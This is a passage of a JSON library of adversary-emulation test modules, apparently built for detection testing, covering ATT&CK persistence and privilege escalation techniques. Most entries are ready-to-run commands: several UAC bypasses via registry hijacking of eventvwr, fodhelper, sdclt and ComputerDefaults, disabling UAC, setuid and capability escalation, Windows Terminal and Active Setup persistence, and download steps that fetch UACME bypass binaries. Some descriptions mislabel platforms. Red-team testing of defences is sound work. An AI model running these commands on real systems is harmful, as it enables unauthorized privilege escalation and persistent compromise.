      "description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "04d55cef-f283-40ba-ae2a-316bc3b5e78c",
      "module_name": "HKLM - re-execute 'Internet Explorer Core Fonts' StubPath payload by decreasing version number"
    },
    {
      "index": 1313,
      "technique_id": "T1547.015",
      "technique_name": "Boot or Logon Autostart Execution: Login Items",
      "description": "Modify Windows Terminal settings.json file to gain persistence. [Twitter Post](https://twitter.com/nas_bench/status/1550836225652686848)",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "mv #{settings_json_def} #{settings_json_tmp}\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/blob/master/rx_modules/T1547.015/src/settings.json?raw=true\" -OutFile \"#{settings_json_def}\"\nwt.exe\n",
        "elevation_required": false,
        "cleanup_command": "mv -Force #{settings_json_tmp} #{settings_json_def}\ntaskkill /F /IM \"#{calculator}\" > $null\n"
      },
      "variables": [
        {
          "name": "calculator",
          "description": "Test program used to imitate a maliciously called program.",
          "type": "string",
          "default_value": "calculator.exe"
        },
        {
          "name": "settings_json_def",
          "description": "Default file for Windows Terminal to replace the default profile with a backdoor to call another program.",
          "type": "path",
          "default_value": "~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"
        },
        {
          "name": "settings_json_tmp",
          "description": "Temp file for Windows Terminal.",
          "type": "path",
          "default_value": "~\\AppData\\Local\\Temp\\settings.json"
        },
        {
          "name": "wt_exe",
          "description": "Windows Terminal executable.",
          "type": "path",
          "default_value": "~\\AppData\\Local\\Microsoft\\WindowsApps\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\wt.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Windows Terminal must be installed\n",
          "check_command": "if (Test-Path #{wt_exe}) {exit 0} else {exit 1}\n",
          "install_command": "$(rm ~\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\LocalState\\StoreEdgeFD\\installed.db -ErrorAction Ignore; Write-Output \"\"; $?) -and $(winget install --id=Microsoft.WindowsTerminal)\n"
        }
      ],
      "rx_module_id": "ec5d76ef-82fe-48da-b931-bdb25a62bc65",
      "module_name": "Persistence by modifying Windows Terminal profile"
    },
    {
      "index": 1314,
      "technique_id": "T1547.015",
      "technique_name": "Boot or Logon Autostart Execution: Login Items",
      "description": "Runs osascript on a file to create new LoginItem for current user.\nNOTE: Will popup dialog prompting user to Allow or Deny Terminal.app to control \"System Events\"\nTherefore, it can't be automated until the TCC is granted.\nThe login item launches Safari.app when user logs in, but there is a cleanup script to remove it as well.\nIn addition to the `osascript` Process Events, file modification events to\n`/Users/*/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm` should be seen.\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "bash",
        "command": "osascript #{scriptfile}\n",
        "elevation_required": false,
        "cleanup_command": "osascript #{cleanup_script}\n"
      },
      "variables": [
        {
          "name": "scriptfile",
          "description": "path to Applescript source to add Safari LoginItem.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1547.015/src/add_login_item.osa"
        },
        {
          "name": "cleanup_script",
          "description": "path to Applescript source to delete Safari LoginItem.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder/T1547.015/src/remove_login_item.osa"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "716e756a-607b-41f3-8204-b214baf37c1d",
      "module_name": "Add macOS LoginItem using Applescript"
    },
    {
      "index": 1315,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "Make, change owner, and change file attributes on a C source code file\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp #{payload} /tmp/hello.c\nsudo chown root /tmp/hello.c\nsudo make /tmp/hello\nsudo chown root /tmp/hello\nsudo chmod u+s /tmp/hello\n/tmp/hello\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm /tmp/hello\nsudo rm /tmp/hello.c\n"
      },
      "variables": [
        {
          "name": "payload",
          "description": "hello.c payload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1548.001/src/hello.c"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "896dfe97-ae43-4101-8e96-9a7996555d80",
      "module_name": "Make and modify binary from C source"
    },
    {
      "index": 1316,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "Make, change owner, and change file attributes on a C source code file\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp #{payload} /tmp/hello.c\nchown root /tmp/hello.c\nmake /tmp/hello\nchown root /tmp/hello\nchmod u+s /tmp/hello\n/tmp/hello\n",
        "elevation_required": true,
        "cleanup_command": "rm /tmp/hello\nrm /tmp/hello.c\n"
      },
      "variables": [
        {
          "name": "payload",
          "description": "hello.c payload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1548.001/src/hello.c"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "dd580455-d84b-481b-b8b0-ac96f3b1dc4c",
      "module_name": "Make and modify binary from C source (freebsd)"
    },
    {
      "index": 1317,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test sets the SetUID flag on a file in FreeBSD.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod u+xs #{file_to_setuid}\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm #{file_to_setuid}\n"
      },
      "variables": [
        {
          "name": "file_to_setuid",
          "description": "Path of file to set SetUID flag",
          "type": "path",
          "default_value": "/tmp/evilBinary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "759055b3-3885-4582-a8ec-c00c9d64dd79",
      "module_name": "Set a SetUID flag on file"
    },
    {
      "index": 1318,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test sets the SetUID flag on a file in FreeBSD.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod u+xs #{file_to_setuid}\n",
        "elevation_required": true,
        "cleanup_command": "rm #{file_to_setuid}\n"
      },
      "variables": [
        {
          "name": "file_to_setuid",
          "description": "Path of file to set SetUID flag",
          "type": "path",
          "default_value": "/tmp/evilBinary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "9be9b827-ff47-4e1b-bef8-217db6fb7283",
      "module_name": "Set a SetUID flag on file (freebsd)"
    },
    {
      "index": 1319,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
      "execution": {
        "platforms": [
          "macos",
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo touch #{file_to_setuid}\nsudo chown root #{file_to_setuid}\nsudo chmod g+xs #{file_to_setuid}\n",
        "elevation_required": true,
        "cleanup_command": "sudo rm #{file_to_setuid}\n"
      },
      "variables": [
        {
          "name": "file_to_setuid",
          "description": "Path of file to set SetGID flag",
          "type": "path",
          "default_value": "/tmp/evilBinary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "db55f666-7cba-46c6-9fe6-205a05c3242c",
      "module_name": "Set a SetGID flag on file"
    },
    {
      "index": 1320,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test sets the SetGID flag on a file in FreeBSD.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod g+xs #{file_to_setuid}\n",
        "elevation_required": true,
        "cleanup_command": "rm #{file_to_setuid}\n"
      },
      "variables": [
        {
          "name": "file_to_setuid",
          "description": "Path of file to set SetGID flag",
          "type": "path",
          "default_value": "/tmp/evilBinary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1f73af33-62a8-4bf1-bd10-3bea931f2c0d",
      "module_name": "Set a SetGID flag on file (freebsd)"
    },
    {
      "index": 1321,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cp #{payload} /tmp/cap.c\nmake /tmp/cap\nsudo setcap cap_setuid=ep /tmp/cap\n/tmp/cap\n",
        "elevation_required": true,
        "cleanup_command": "rm /tmp/cap\nrm /tmp/cap.c\n"
      },
      "variables": [
        {
          "name": "payload",
          "description": "cap.c payload",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1548.001/src/cap.c"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "db53959c-207d-4000-9e7a-cd8eb417e072",
      "module_name": "Make and modify capabilities of a binary"
    },
    {
      "index": 1322,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test gives a file the capability to set UID without using flags.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "touch #{file_to_setcap}\nsudo setcap cap_setuid=ep #{file_to_setcap}\n",
        "elevation_required": true,
        "cleanup_command": "rm #{file_to_setcap}\n"
      },
      "variables": [
        {
          "name": "file_to_setcap",
          "description": "Path of file to provide the SetUID capability",
          "type": "path",
          "default_value": "/tmp/evilBinary"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "1ac3272f-9bcf-443a-9888-4b1d3de785c1",
      "module_name": "Provide the SetUID capability to a file"
    },
    {
      "index": 1323,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "find /usr/bin -perm -4000\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8e36da01-cd29-45fd-be72-8a0fcaad4481",
      "module_name": "Do reconnaissance for files that have the setuid bit set"
    },
    {
      "index": 1324,
      "technique_id": "T1548.001",
      "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
      "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "find /usr/bin -perm -2000\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3fb46e17-f337-4c14-9f9a-a471946533e2",
      "module_name": "Do reconnaissance for files that have the setgid bit set"
    },
    {
      "index": 1325,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\ncmd.exe /c eventvwr.msc\n",
        "elevation_required": false,
        "cleanup_command": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "5073adf8-9a50-4bd9-b298-a9bd2ead8af9",
      "module_name": "Bypass UAC using Event Viewer (cmd)"
    },
    {
      "index": 1326,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\eventvwr.msc\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a6ce9acf-842a-4af6-8f79-539be7608e2b",
      "module_name": "Bypass UAC using Event Viewer (PowerShell)"
    },
    {
      "index": 1327,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"#{executable_binary}\" /f\nreg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f\nfodhelper.exe\n",
        "elevation_required": false,
        "cleanup_command": "reg.exe delete hkcu\\software\\classes\\ms-settings /f >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "58f641ea-12e3-499a-b684-44dee46bd182",
      "module_name": "Bypass UAC using Fodhelper"
    },
    {
      "index": 1328,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\fodhelper.exe\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3f627297-6c38-4e7d-a278-fc2563eaaeaa",
      "module_name": "Bypass UAC using Fodhelper - PowerShell"
    },
    {
      "index": 1329,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force\nNew-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force\nSet-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"#{executable_binary}\" -Force\nStart-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3c51abf2-44bf-42d8-9111-dc96ff66750f",
      "module_name": "Bypass UAC using ComputerDefaults (PowerShell)"
    },
    {
      "index": 1330,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\"\ncopy \"#{executable_binary}\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\nmklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\"\n",
        "elevation_required": true,
        "cleanup_command": "rd \"\\\\?\\C:\\Windows \\\" /S /Q >nul 2>nul\ndel \"c:\\testbypass.exe\" >nul 2>nul\n"
      },
      "variables": [
        {
          "name": "executable_binary",
          "description": "Binary to execute with UAC Bypass",
          "type": "path",
          "default_value": "C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
      "module_name": "Bypass UAC by Mocking Trusted Directories"
    },
    {
      "index": 1331,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Command to execute",
          "type": "string",
          "default_value": "cmd.exe /c notepad.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "3be891eb-4608-4173-87e8-78b494c029b7",
      "module_name": "Bypass UAC using sdclt DelegateExecute"
    },
    {
      "index": 1332,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "9e8af564-53ec-407e-aaa8-3cb20c3af7f9",
      "module_name": "Disable UAC using reg.exe"
    },
    {
      "index": 1333,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{file_path}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "file_path",
          "description": "Path to the bat file",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1548.002\\src\\T1548.002.bat"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "28104f8a-4ff1-4582-bcf6-699dce156608",
      "module_name": "Bypass UAC using SilentCleanup task"
    },
    {
      "index": 1334,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nNew-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "8ceab7a2-563a-47d2-b5ba-0995211128d7",
      "module_name": "UACME Bypass Method 23"
    },
    {
      "index": 1335,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "b0f76240-9f33-4d34-90e8-3a7d501beb15",
      "module_name": "UACME Bypass Method 31"
    },
    {
      "index": 1336,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "UACME executable must exist on disk at specified location (\"#{uacme_exe}\")\n",
          "check_command": "$tempPath = cmd /c echo #{uacme_exe}\nif (Test-Path \"$tempPath\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1548.002/bin/uacme.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme\" -Force\nRemove-Item \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\uacme.zip\" -Force\n"
        }
      ],
      "rx_module_id": "e514bb03-f71c-4b22-9092-9f961ec6fb03",
      "module_name": "UACME Bypass Method 33"
    },
    {
      "index": 1337,
      "technique_id": "T1548.002",
      "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
      "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "\"#{uacme_exe}\"\n",
        "elevation_required": false,
        "cleanup_command": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore\npowershell Stop-Process -Name mmc -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "uacme_exe",
          "description": "Path to uacme executable",
          "type": "path",
